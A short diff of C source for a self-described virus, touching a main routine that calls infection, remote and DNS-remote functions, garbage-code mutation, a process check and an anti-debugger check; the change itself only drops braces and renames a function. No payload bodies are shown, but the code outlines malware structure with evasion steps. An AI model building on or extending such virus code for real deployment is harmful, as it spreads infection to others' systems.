@@ -77,9 +77,7 @@ void do_infection(){
 int virus(int ac, char **av){
 	if (opt.do_remote) remote();
 	if (opt.do_dns_remote)
-	{
 		dns_remote();
-	}
  	if (opt.print_msg) println("[I am a bad virus]");
 
 	change_garbage_code();
@@ -94,7 +92,7 @@ int main(int ac, char **av){
 	cmp[2] = 's';
 	cmp[3] = 't';
 	cmp[4] = '\0';
-	if (check_prop(cmp) == FALSE)
+	if (checkproc(cmp) == FALSE)
 		return FALSE;
 	if (checkdebug() == 0)
 	{
